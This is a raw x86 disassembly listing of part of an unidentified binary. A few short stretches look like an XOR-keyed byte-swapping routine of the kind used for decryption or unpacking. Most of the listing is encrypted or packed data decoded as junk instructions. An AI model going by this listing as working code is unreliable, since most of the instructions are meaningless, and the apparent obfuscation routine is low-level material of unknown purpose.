  40c0e6:	(bad)  
  40c0e7:	cmp    BYTE PTR [ebx],cl
  40c0e9:	je     0x40c0a8
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    si,WORD PTR ds:[ecx-0x4d]
  40c145:	or     ebp,edi
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c0f1
  40c150:	and    dh,dl
  40c152:	sbb    al,bl
  40c154:	test   BYTE PTR [ecx-0x14f5bb57],0x3d
  40c15b:	mov    eax,ds:0xcd82f218
  40c160:	push   cs
  40c161:	ins    DWORD PTR es:[edi],dx
  40c162:	dec    edx
  40c163:	neg    DWORD PTR [edx]
  40c165:	shl    BYTE PTR [edx+edx*8],0x44
  40c169:	mov    cl,0xfc
  40c16b:	sub    esi,eax
  40c16d:	cwde   
  40c16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c16f:	imul   ebp,ebp,0xb
  40c172:	call   0xc77b06fa
  40c177:	(bad)  
  40c178:	cli    
  40c179:	push   ds
  40c17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c17b:	ficom  DWORD PTR [esi+0x3d]
  40c17e:	test   al,0x85
  40c180:	cli    
  40c181:	sub    eax,DWORD PTR [ebx+0x52b4822c]
  40c187:	fcom   DWORD PTR [ebp-0x27446a2b]
  40c18d:	push   esp
  40c18e:	retf   0xcb1e
  40c191:	(bad)  
  40c192:	in     al,0x42
  40c194:	aam    0x2a
  40c196:	aas    
  40c197:	(bad)  
  40c198:	stos   BYTE PTR es:[edi],al
  40c199:	test   eax,0xbd68400d
  40c19e:	jmp    0x40c15f
  40c1a0:	mov    ss,WORD PTR [ebx-0x24]
  40c1a3:	mov    ds,edi
  40c1a5:	icebp  
  40c1a6:	das    
  40c1a7:	pop    ebp
  40c1a8:	sti    
  40c1a9:	push   ss
  40c1aa:	lahf   
  40c1ab:	cmp    al,0xd7
  40c1ad:	pusha  
  40c1ae:	imul   ecx,DWORD PTR [edi-0x27],0xffffffff
  40c1b2:	sbb    cl,BYTE PTR [ebx+0x55]
  40c1b5:	adc    esi,DWORD PTR [ebx-0x56cc95bf]
  40c1bb:	jbe    0x40c193
  40c1bd:	in     eax,dx
  40c1be:	jae    0x40c1a9
  40c1c0:	sbb    eax,0x66d8d5a7
  40c1c5:	cmc    
  40c1c6:	leave  
  40c1c7:	ins    DWORD PTR es:[edi],dx
  40c1c8:	pop    ebp
  40c1c9:	clc    
  40c1ca:	mov    al,0x5
  40c1cc:	add    edx,esp
  40c1ce:	ror    BYTE PTR [edx],1
  40c1d0:	fcmove st,st(4)
  40c1d2:	paddusb mm0,QWORD PTR [eax-0x6ad8e8d9]
  40c1d9:	push   0xffffffb6
  40c1db:	xchg   ebx,eax
  40c1dc:	in     al,dx
  40c1dd:	mov    al,0x9
  40c1df:	xor    BYTE PTR [ebx-0x6470b2c2],al
  40c1e5:	fst    DWORD PTR [ebp+ebp*4-0x7c]
  40c1e9:	and    eax,0x1204b72b
  40c1ee:	aam    0x3c
  40c1f0:	inc    esi
  40c1f1:	ins    DWORD PTR es:[edi],dx
  40c1f2:	rol    BYTE PTR [ebp+0x4de3c6f7],1
  40c1f8:	ja     0x40c184
  40c1fa:	sbb    DWORD PTR ds:0xb29bdb28,ebp
  40c200:	and    esp,DWORD PTR [ecx+0x2d]
  40c203:	mov    ecx,0xa083c85c
  40c208:	jnp    0x40c275
  40c20a:	repnz addr16 icebp 
  40c20d:	add    DWORD PTR [eax-0x4a45a4a8],0x61e19910
  40c217:	add    bh,BYTE PTR [ebp-0x6a802af4]
  40c21d:	loopne 0x40c1ab
  40c21f:	or     edx,DWORD PTR [esi+0x26]
  40c222:	aaa    
  40c223:	mov    al,0x55
  40c225:	inc    edx
  40c226:	mov    DWORD PTR [edi+0x3471f24b],eax
  40c22c:	arpl   WORD PTR [ebx+0x12],bx
  40c22f:	inc    edx
  40c230:	pop    ss
  40c231:	ficom  WORD PTR [ebx+0x31]
  40c234:	push   ss
  40c235:	lods   al,BYTE PTR ds:[esi]
  40c236:	shr    DWORD PTR [ecx+ecx*1-0xbb385a3],cl
  40c23d:	addr16 pop ss
  40c23f:	push   esp
  40c240:	in     eax,dx
  40c241:	ss iret 
  40c243:	lahf   
  40c244:	jle    0x40c2c1
  40c246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c247:	div    DWORD PTR [edx-0x13faed1a]
  40c24d:	rcr    BYTE PTR [edi-0x7393ea56],0xa2
  40c254:	dec    esi
  40c255:	pop    eax
  40c256:	jge    0x40c217
  40c258:	push   0xffffff8b
  40c25a:	retf   
  40c25b:	jp     0x40c284
  40c25d:	jmp    0x40c228
  40c25f:	push   ds
  40c260:	fwait
  40c261:	dec    esi
  40c262:	test   al,0x79
  40c264:	push   es
  40c265:	cmp    cl,al
  40c267:	mov    ecx,es
  40c269:	push   0xfffffffb
  40c26b:	xchg   edi,eax
  40c26c:	push   esp
  40c26d:	mov    DWORD PTR [esi],esp
  40c26f:	leave  
  40c270:	xor    ebx,DWORD PTR [esi+0xf8da9f4]
  40c276:	sub    eax,0x25772ccd
  40c27b:	fistp  DWORD PTR [ebx]
  40c27d:	inc    eax
  40c27e:	fnsave [ecx+0x42c2e18e]
  40c284:	mov    WORD PTR [ebx-0x6e],es
  40c287:	(bad)  
  40c288:	xchg   ebx,eax
  40c289:	adc    bh,0xd9
  40c28c:	inc    esp
  40c28d:	bound  esp,QWORD PTR [ecx+0x45]
  40c290:	mov    esi,ebx
  40c292:	cld    
  40c293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c294:	xchg   cl,ah
  40c296:	cld    
  40c297:	call   0xaaddde2b
  40c29c:	xlat   BYTE PTR ds:[ebx]
  40c29d:	popf   
  40c29e:	shr    eax,cl
  40c2a0:	and    al,0x3a
  40c2a2:	push   ds
  40c2a3:	sbb    al,0xf
  40c2a5:	loope  0x40c2c4
  40c2a7:	cmp    BYTE PTR [edx],al
  40c2a9:	push   esi
  40c2aa:	adc    dl,cl
  40c2ac:	test   edi,edi
  40c2ae:	loopne 0x40c285
  40c2b0:	dec    edx
  40c2b1:	pop    esp
  40c2b2:	inc    ebx
  40c2b3:	cmp    al,0x78
  40c2b5:	fwait
  40c2b6:	jb     0x40c2a6
  40c2b8:	or     esp,ebx
  40c2ba:	int    0x96
  40c2bc:	sahf   
  40c2bd:	cmp    DWORD PTR [ebp-0x480d11d7],edi
  40c2c3:	jl     0x40c316
  40c2c5:	jb     0x40c32f
  40c2c7:	daa    
  40c2c8:	mov    eax,0x6ad48563
  40c2cd:	mov    ch,0xc0
  40c2cf:	mov    cl,al
  40c2d1:	push   esp
  40c2d2:	popf   
  40c2d3:	das    
  40c2d4:	pop    es
  40c2d5:	sub    DWORD PTR ds:0x49920a6f,eax
  40c2db:	push   0x3f
  40c2dd:	inc    eax
  40c2de:	jle    0x40c336
  40c2e0:	jge    0x40c2cb
  40c2e2:	mov    ds:0x8fab058d,eax
  40c2e7:	push   ebx
  40c2e8:	cwde   
  40c2e9:	push   cs
  40c2ea:	and    DWORD PTR [esi],ecx
  40c2ec:	lock shl DWORD PTR [ecx+ebp*2],cl
  40c2f0:	cmp    BYTE PTR [ebp-0x3e],bl
  40c2f3:	outs   dx,BYTE PTR ds:[esi]
  40c2f4:	add    dl,BYTE PTR [eax+0x5]
  40c2f7:	stc    
  40c2f8:	jmp    0xb487dc22
  40c2fd:	inc    ecx
  40c2fe:	xchg   edx,eax
  40c2ff:	gs xchg ecx,eax
  40c301:	sbb    eax,edx
  40c303:	dec    eax
  40c304:	call   0x841b:0xa95833de
  40c30b:	cmp    ah,BYTE PTR [esi+0x40]
  40c30e:	xchg   esp,ebp
  40c310:	in     al,dx
  40c311:	aad    0xd4
  40c313:	retf   
  40c314:	shr    DWORD PTR [edx],1
  40c316:	addr16 (bad) 
  40c319:	inc    edx
  40c31a:	sahf   
  40c31b:	test   DWORD PTR [edx-0x43445f8d],ecx
  40c321:	push   es
  40c322:	into   
  40c323:	push   DWORD PTR [edi+0x2996fba8]
  40c329:	in     eax,dx
  40c32a:	mov    edi,edx
  40c32c:	pop    ebp
  40c32d:	stos   BYTE PTR es:[edi],al
  40c32e:	cli    
  40c32f:	pop    ss
  40c330:	stc    
  40c331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c332:	fbstp  TBYTE PTR [eax+0x24]
  40c335:	dec    edx
  40c336:	mov    cs,WORD PTR ds:0x2d080e2e
  40c33c:	cmp    BYTE PTR [edi+0x18],al
  40c33f:	aam    0x75
  40c341:	ds pushf 
  40c343:	push   cs
  40c344:	add    BYTE PTR [ebp+0x73fa4448],cl
  40c34a:	add    cl,BYTE PTR [esi+0xc]
  40c34d:	mov    dl,0x79
  40c34f:	push   ds
  40c350:	mov    al,0x8f
  40c352:	repnz mov cl,0xae
  40c355:	jl     0x40c36e
  40c357:	mov    ch,0xad
  40c359:	jmp    0x6ee7:0xc2bfa4bd
  40c360:	fidiv  DWORD PTR [esp+edi*8]
  40c363:	and    dh,ah
  40c365:	fnsave [ecx+ebp*8-0x6401007e]
  40c36c:	sub    al,0x4a
  40c36e:	scas   eax,DWORD PTR es:[edi]
  40c36f:	(bad)  
  40c370:	cmc    
  40c371:	jnp    0x40c3ee
  40c373:	mov    bl,0x56
  40c375:	inc    edx
  40c376:	aad    0x46
  40c378:	mov    eax,ds:0xe3a5f105
  40c37d:	fwait
  40c37e:	lds    esp,FWORD PTR [edi+ebp*1]
  40c381:	fadd   QWORD PTR [ecx+eax*1-0x72ee3e0d]
  40c388:	and    edx,edi
  40c38a:	das    
  40c38b:	cld    
  40c38c:	add    eax,0xed499355
  40c391:	mov    ah,0xc7
  40c393:	ja     0x40c3ba
  40c395:	in     al,0x99
  40c397:	pop    ebp
  40c398:	leave  
  40c399:	sbb    ebx,0x4a382841
  40c39f:	pop    esp
  40c3a0:	xchg   esp,eax
  40c3a1:	sbb    eax,DWORD PTR [edi+0x1075321]
  40c3a7:	je     0x40c3e9
  40c3a9:	pop    eax
  40c3aa:	int    0x4e
  40c3ac:	mov    ebx,DWORD PTR [ebx+0x426f075f]
  40c3b2:	xlat   BYTE PTR ds:[ebx]
  40c3b3:	pop    edx
  40c3b4:	mov    edi,0x6b49e790
  40c3b9:	call   0xa577:0x5e3aaf86
  40c3c0:	mov    cl,0x3e
  40c3c2:	sbb    DWORD PTR [ecx-0x5a3db9db],ebp
  40c3c8:	sbb    eax,0x9b0975f3
  40c3cd:	(bad)  
  40c3ce:	dec    edx
  40c3cf:	lods   al,BYTE PTR ds:[esi]
  40c3d0:	mov    ecx,0xaf272acc
  40c3d5:	outs   dx,DWORD PTR ds:[esi]
  40c3d6:	pushf  
  40c3d7:	pop    esi
  40c3d8:	(bad)  
  40c3d9:	lods   eax,DWORD PTR ds:[esi]
  40c3da:	pop    edx
  40c3db:	cmp    edx,ebp
  40c3dd:	add    BYTE PTR [eax-0x1cc4af9],ch
  40c3e3:	and    ah,BYTE PTR [edi]
  40c3e5:	les    ebx,FWORD PTR ds:0x2f010ffd
  40c3eb:	fwait
  40c3ec:	pop    es
  40c3ed:	sbb    DWORD PTR [esi],esp
  40c3ef:	push   cs
  40c3f0:	int3   
  40c3f1:	sahf   
  40c3f2:	add    esi,edx
  40c3f4:	shl    BYTE PTR ds:0xa314f668,0xf2
  40c3fb:	div    DWORD PTR [esi]
  40c3fd:	gs mov ch,0xca
  40c400:	add    al,ch
  40c402:	das    
  40c403:	add    BYTE PTR [eax],dl
  40c405:	fcmovne st,st(3)
  40c407:	dec    esi
  40c408:	jbe    0x40c3db
  40c40a:	(bad)  
  40c40b:	mov    eax,0xa0fdfae1
  40c410:	loop   0x40c3e5
  40c412:	mov    dh,0xc1
  40c414:	test   esp,0xd4ca9126
  40c41a:	xchg   esi,eax
  40c41b:	jl     0x40c3d5
  40c41d:	aam    0xc5
  40c41f:	adc    al,0x34
  40c421:	inc    ebp
  40c422:	arpl   si,bp
  40c424:	mov    dl,dh
  40c426:	add    DWORD PTR [edi],eax
  40c428:	push   ebx
  40c429:	jb     0x40c42b
  40c42b:	cs dec ebp
  40c42d:	bound  edi,QWORD PTR [ebx+ebp*8-0x66]
  40c431:	data16 xchg BYTE PTR [edi],bl
  40c434:	jmp    0xab67608a
  40c439:	sbb    al,0xd4
  40c43b:	jge    0x40c3e4
  40c43d:	and    esi,DWORD PTR [ebx+0x359fd099]
  40c443:	dec    esi
  40c444:	pop    esp
  40c445:	mov    esp,0xc4d853fc
  40c44a:	jne    0x40c40d
  40c44c:	add    eax,0x557e5bcb
  40c451:	push   cs
  40c452:	sub    eax,0xe3ead2f
  40c457:	xlat   BYTE PTR ds:[ebx]
  40c458:	pop    ss
  40c459:	pop    es
  40c45a:	inc    ebx
  40c45b:	push   DWORD PTR [eax-0x32]
  40c45e:	add    al,0xef
  40c460:	rcl    DWORD PTR [esi],0x3a
  40c463:	mov    cl,BYTE PTR [esi+0x1bbff4e4]
  40c469:	adc    DWORD PTR [edx-0x179b3f2f],0xae78c873
  40c473:	mov    dl,0xf8
  40c475:	sub    DWORD PTR [ecx+eax*4+0xf],0xffffff9c
  40c47a:	jae    0x40c461
  40c47c:	out    dx,eax
  40c47d:	mov    edx,0x2bb68294
  40c482:	and    al,0xa9
  40c484:	xchg   ebx,eax
  40c485:	inc    eax
  40c486:	test   al,0x11
  40c488:	dec    esp
  40c489:	test   DWORD PTR [esp+edi*2-0x3e184867],0x8c4a1481
  40c494:	sbb    BYTE PTR [ebp-0x19ba2412],cl
  40c49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c49b:	loop   0x40c4ca
  40c49d:	jno    0x40c508
  40c49f:	adc    esp,ebp
  40c4a1:	sub    ebx,esp
  40c4a3:	inc    esi
  40c4a4:	or     edx,eax
  40c4a6:	in     eax,dx
  40c4a7:	lock cmp BYTE PTR [edi+0x1d613d1f],0xbb
  40c4af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4b0:	idiv   DWORD PTR [ebp-0x248492cb]
  40c4b6:	enter  0xae71,0x3e
  40c4ba:	mov    bl,0xa8
  40c4bc:	pop    eax
  40c4bd:	mov    ch,0xcb
  40c4bf:	arpl   WORD PTR [ecx-0x5a],cx
  40c4c2:	cmp    al,0x93
  40c4c4:	push   ebx
  40c4c5:	fnstenv [ecx+0x50e01128]
  40c4cb:	psrlw  mm5,0x76
  40c4cf:	mov    esi,0xd5e62aaf
  40c4d4:	aas    
  40c4d5:	xor    dh,BYTE PTR [eax+0x132380df]
  40c4db:	and    BYTE PTR [ecx-0x1],dl
  40c4de:	(bad)  
  40c4df:	dec    edx
  40c4e0:	pop    esi
  40c4e1:	leave  
  40c4e2:	das    
  40c4e3:	sub    DWORD PTR [ecx-0x5b],0x40
  40c4e7:	ror    BYTE PTR [ebp+0x7a],0xb2
  40c4eb:	fcomp  QWORD PTR [esi+0x33571226]
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	mov    esi,0x4daa6225
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c57e
  40c54d:	arpl   di,dx
  40c54f:	pop    ebp
  40c550:	popa   
  40c551:	or     esp,DWORD PTR ds:0x615e201a
  40c557:	sahf   
  40c558:	pusha  
  40c559:	inc    edx
  40c55a:	add    eax,0x160994da
  40c55f:	and    al,0x34
  40c561:	mov    esp,0x784bce92
  40c566:	mov    ds:0x54c57926,al
  40c56b:	mov    ecx,0x846507a
  40c570:	sbb    dh,ch
  40c572:	popf   
  40c573:	leave  
  40c574:	cwde   
  40c575:	jg     0x40c55e
  40c577:	or     eax,DWORD PTR [edx]
  40c579:	into   
  40c57a:	mov    ebp,0xf5510126
  40c57f:	lods   al,BYTE PTR ds:[esi]
  40c580:	arpl   WORD PTR [eax],ax
  40c582:	pusha  
  40c583:	ja     0x40c5e1
  40c585:	add    cl,BYTE PTR [edx+0x6aae55c8]
  40c58b:	call   0xf1de:0xc6cbe50e
  40c592:	popf   
  40c593:	add    BYTE PTR [ecx-0x7e],ch
  40c596:	xchg   ebp,eax
  40c597:	sub    eax,0x7ecdd241
  40c59c:	sbb    ah,BYTE PTR [ecx+0x7bb29b0]
  40c5a2:	(bad)  [esi+0x6f918c6c]
  40c5a8:	push   cs
  40c5a9:	retf   0xb4b6
  40c5ac:	jno    0x40c52e
  40c5ae:	pop    esp
  40c5af:	imul   eax,DWORD PTR [esp+ebx*4],0xfffffffb
  40c5b3:	in     eax,dx
  40c5b4:	fidiv  WORD PTR [edx+0x4af72114]
  40c5ba:	cwde   
  40c5bb:	daa    
  40c5bc:	call   0xed0881cc
  40c5c1:	shl    DWORD PTR [eax],1
  40c5c3:	dec    ebp
  40c5c4:	xchg   esi,eax
  40c5c5:	or     eax,0xa3f7c21d
  40c5ca:	in     al,0x15
  40c5cc:	aam    0xe3
  40c5ce:	pop    ecx
  40c5cf:	sahf   
  40c5d0:	mov    ecx,0x184ad51b
  40c5d5:	xchg   ecx,eax
  40c5d6:	les    eax,FWORD PTR [eax+0x3d1fecd1]
  40c5dc:	lods   al,BYTE PTR ds:[esi]
  40c5dd:	xchg   edx,eax
  40c5de:	inc    esi
  40c5df:	sbb    cl,ch
  40c5e1:	sahf   
  40c5e2:	std    
  40c5e3:	stos   BYTE PTR es:[edi],al
  40c5e4:	sti    
  40c5e5:	mov    ebp,0x24938551
  40c5ea:	mul    BYTE PTR [edi+0x75]
  40c5ed:	shl    DWORD PTR [ebx],0xf2
  40c5f0:	pop    edi
  40c5f1:	pop    ecx
  40c5f2:	pop    eax
  40c5f3:	stos   BYTE PTR es:[edi],al
  40c5f4:	mov    al,ds:0x19687cbe
  40c5f9:	mov    ds:0xc0da1441,eax
  40c5fe:	sub    DWORD PTR [ecx-0x7288a345],0x9fb3e606
  40c608:	leave  
  40c609:	or     eax,0x61fbb4e2
  40c60e:	adc    eax,0x32777315
  40c613:	in     al,dx
  40c614:	mov    DWORD PTR [ebx+0x2784240c],0x1ab55c5d
  40c61e:	sbb    BYTE PTR [ecx-0x74fd03c],0xbd
  40c625:	sahf   
  40c626:	aam    0xac
  40c628:	int    0xf9
  40c62a:	scas   al,BYTE PTR es:[edi]
  40c62b:	adc    DWORD PTR [edi-0x7cb5a97d],esi
  40c631:	ds push edi
  40c633:	jnp    0x40c657
  40c635:	std    
  40c636:	nop
  40c637:	repz mov edx,0x4f2e5299
  40c63d:	dec    ebp
  40c63e:	adc    ecx,DWORD PTR [edi*4+0x235c0a33]
  40c645:	rol    al,1
  40c647:	das    
  40c648:	push   0xffffffd8
  40c64a:	sbb    eax,0x84e95656
  40c64f:	ret    
  40c650:	mov    ds:0x2a11ef88,eax
  40c655:	mov    cl,0x8f
  40c657:	rcr    BYTE PTR [ecx+0x66],cl
  40c65a:	mov    dl,0x28
  40c65c:	or     al,0x59
  40c65e:	pop    eax
  40c65f:	call   0xd1101c91
  40c664:	pop    edi
  40c665:	xchg   ecx,eax
  40c666:	mov    WORD PTR [edi+0x24],gs
  40c669:	repnz repz mov ah,0xff
  40c66d:	pusha  
  40c66e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66f:	add    esi,esp
  40c671:	addr16 and al,0x5c
  40c674:	dec    ecx
  40c675:	loop   0x40c64e
  40c677:	jl     0x40c6e7
  40c679:	mov    esi,0x367eef77
  40c67e:	sbb    ecx,edx
  40c680:	inc    eax
  40c681:	mov    esp,0x651497b0
  40c686:	popa   
  40c687:	ss in  eax,0x19
  40c68a:	mov    eax,0x46b0b442
  40c68f:	mov    ds:0xbe4407c0,eax
  40c694:	or     BYTE PTR [ebp+ebx*1-0x60ebce0a],0xe0
  40c69c:	jns    0x40c6d1
  40c69e:	sbb    edx,DWORD PTR [eax-0x1e1a541d]
  40c6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a5:	ror    BYTE PTR [ecx],1
  40c6a7:	mov    ah,0x7b
  40c6a9:	mov    eax,ds:0x1209fcd0
  40c6ae:	ss add al,0x3f
  40c6b1:	pushf  
  40c6b2:	out    0x21,al
  40c6b4:	call   0x7909:0x6f112578
  40c6bb:	sub    DWORD PTR [eax],0x6a
  40c6be:	sub    ah,BYTE PTR ds:0xa48a032e
  40c6c4:	mov    ds:0x66f21abf,al
  40c6c9:	and    BYTE PTR [ebx],ch
  40c6cb:	mov    eax,0xb35dff09
  40c6d0:	lahf   
  40c6d1:	call   0xd9824877
  40c6d6:	mov    eax,0xb6fe3ee6
  40c6db:	pop    ecx
  40c6dc:	cmp    BYTE PTR [edi-0x718fe7cc],bl
  40c6e2:	cli    
  40c6e3:	stos   BYTE PTR es:[edi],al
  40c6e4:	mov    al,0x88
  40c6e6:	in     al,0x5
  40c6e8:	sub    BYTE PTR ds:0x3700ced5,0xb4
  40c6ef:	and    cl,bl
  40c6f1:	in     eax,0xc7
  40c6f3:	inc    eax
  40c6f4:	scas   al,BYTE PTR es:[edi]
  40c6f5:	adc    al,BYTE PTR [eax]
  40c6f7:	fmul   DWORD PTR [esi]
  40c6f9:	xchg   ecx,eax
  40c6fa:	inc    eax
  40c6fb:	pop    DWORD PTR [ebp-0x7b]
  40c6fe:	dec    edi
  40c6ff:	icebp  
  40c700:	mov    ds:0x11074d56,al
  40c705:	jbe    0x40c77d
  40c707:	icebp  
  40c708:	dec    ebx
  40c709:	jmp    0xbe1d:0xb4a6c89d
  40c710:	aas    
  40c711:	inc    esp
  40c712:	or     DWORD PTR [esi-0x1896ab69],0xffffffa1
  40c719:	imul   esi,DWORD PTR [ecx+0x4c5be30b],0xffffffeb
  40c720:	dec    edi
  40c721:	enter  0x7ad4,0x87
  40c725:	mov    dl,0x6a
  40c727:	dec    edx
  40c728:	sub    dh,BYTE PTR [esi+0x72]
  40c72b:	je     0x40c6b2
  40c72d:	popf   
  40c72e:	out    0x5d,al
  40c730:	stos   BYTE PTR es:[edi],al
  40c731:	cmp    esp,DWORD PTR [edx+0x6]
  40c734:	jo     0x40c6cb
  40c736:	adc    al,0xa2
  40c738:	or     esp,DWORD PTR [edi-0x21]
  40c73b:	xor    ch,BYTE PTR [ecx+0x791695f4]
  40c741:	xor    bh,dl
  40c743:	mov    eax,ds:0xfc955cef
  40c748:	(bad)  
  40c749:	xor    eax,0xd2e7e5
  40c74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c74f:	fdiv   QWORD PTR [esp+esi*4]
  40c752:	lods   eax,DWORD PTR ds:[esi]
  40c753:	push   edx
  40c754:	(bad)  
  40c756:	fptan  
  40c758:	stos   DWORD PTR es:[edi],eax
  40c759:	mov    dl,0x30
  40c75b:	jge    0x40c7da
  40c75d:	push   esi
  40c75e:	sbb    esi,DWORD PTR [edx]
  40c760:	cmp    al,0x4f
  40c762:	xor    BYTE PTR [ebx-0x43],cl
  40c765:	out    0x1d,eax
  40c767:	mov    cl,0x73
  40c769:	pushf  
  40c76a:	outs   dx,BYTE PTR ds:[esi]
  40c76b:	pop    ebx
  40c76c:	loope  0x40c7cb
  40c76e:	hlt    
  40c76f:	xchg   ecx,eax
  40c770:	in     eax,dx
  40c771:	scas   al,BYTE PTR es:[edi]
  40c772:	(bad)  
  40c773:	jno    0x40c7b9
  40c775:	sbb    ch,ah
  40c777:	mov    al,0xb7
  40c779:	and    DWORD PTR [esi],0xffffffd8
  40c77c:	dec    edx
  40c77d:	out    0x23,al
  40c77f:	mov    es,WORD PTR [edx-0x73d4b87e]
  40c785:	jmp    0x40c75c
  40c787:	arpl   sp,sp
  40c789:	mov    ecx,0x806fb99
  40c78e:	cdq    
  40c78f:	dec    esi
  40c790:	in     eax,0xf3
  40c792:	push   ss
  40c793:	call   0xd93e7d9b
  40c798:	out    dx,al
  40c799:	inc    ecx
  40c79a:	test   bh,al
  40c79c:	lock jmp 0x5f2f:0x24e6d48b
  40c7a4:	fwait
  40c7a5:	loopne 0x40c821
  40c7a7:	rol    BYTE PTR [ebp+0x15],0xb5
  40c7ab:	(bad)  [ecx]
  40c7ad:	pop    ds
  40c7ae:	(bad)  
  40c7af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7b0:	mov    dl,0x52
  40c7b2:	(bad)  
  40c7b3:	aam    0x70
  40c7b5:	fstp   DWORD PTR [ecx+0x2794386f]
  40c7bb:	inc    edx
  40c7bc:	maskmovq mm7,(bad)
  40c7bd:	idiv   DWORD PTR [edi-0x3e26dc02]
  40c7c3:	mov    edi,0x4168b0af
  40c7c8:	dec    edx
  40c7c9:	into   
  40c7ca:	jmp    DWORD PTR [edx+0x24]
  40c7cd:	pop    edx
  40c7ce:	sbb    eax,0x8973a214
  40c7d3:	fist   DWORD PTR [eax]
  40c7d5:	popf   
  40c7d6:	pop    ds
  40c7d7:	lahf   
  40c7d8:	sahf   
  40c7d9:	(bad)  
  40c7da:	jne    0x40c768
  40c7dc:	out    0x6a,eax
  40c7de:	dec    ecx
  40c7df:	in     al,dx
  40c7e0:	call   0xf56aeabd
  40c7e5:	and    dl,ah
  40c7e7:	adc    DWORD PTR [edx-0x7e98bfd1],ebx
  40c7ed:	mov    edx,0xbde5fd58
  40c7f2:	inc    esp
  40c7f3:	imul   esp,DWORD PTR [ebx-0xa],0x64
  40c7f7:	rol    DWORD PTR [ecx+0x61],cl
  40c7fa:	mul    bh
  40c7fc:	fwait
  40c7fd:	ss in  al,dx
  40c7ff:	xchg   DWORD PTR [esi+0x6e66bb62],esp
  40c805:	cmp    bp,bx
  40c808:	lods   eax,DWORD PTR ds:[esi]
  40c809:	and    edi,DWORD PTR [edx+0x794f3889]
  40c80f:	push   ecx
  40c810:	scas   al,BYTE PTR es:[edi]
  40c811:	int    0x93
  40c813:	mov    ebx,ecx
  40c815:	fcomp  st(3)
  40c817:	push   es
  40c818:	sub    eax,0x64fd4b2f
  40c81d:	mov    edi,0x19ff9547
  40c822:	scas   eax,DWORD PTR es:[edi]
  40c823:	mov    WORD PTR [ebx],gs
  40c825:	jns    0x40c7d5
  40c827:	adc    BYTE PTR [ebx+eiz*4-0x25a81c2a],dl
  40c82e:	leave  
  40c82f:	xchg   dl,bh
  40c831:	jle    0x40c82a
  40c833:	outs   dx,DWORD PTR ds:[esi]
  40c834:	fidiv  DWORD PTR [ecx+0x6fecc4f1]
  40c83a:	push   ebx
  40c83b:	das    
  40c83c:	add    eax,0xdc7646e3
  40c841:	jae    0x40c812
  40c843:	out    dx,al
  40c844:	enter  0x7638,0xa7
  40c848:	mov    ds:0x7e385211,eax
  40c84d:	scas   eax,DWORD PTR es:[edi]
  40c84e:	icebp  
  40c84f:	loopne 0x40c812
  40c851:	cli    
  40c852:	sub    eax,0xab8f7e33
  40c857:	push   esi
  40c858:	jmp    0xec411324
  40c85d:	sub    al,BYTE PTR [ecx+0x2067cd4a]
  40c863:	add    DWORD PTR [eax-0x1b6141eb],edx
  40c869:	mov    eax,ds:0x830994a0
  40c86e:	mov    ch,0xd9
  40c870:	in     al,0x10
  40c872:	mov    esi,0xe9cebcd4
  40c877:	push   esi
  40c878:	mov    cl,0x60
  40c87a:	or     edi,edx
  40c87c:	stc    
  40c87d:	fsub   QWORD PTR [eax-0x5c]
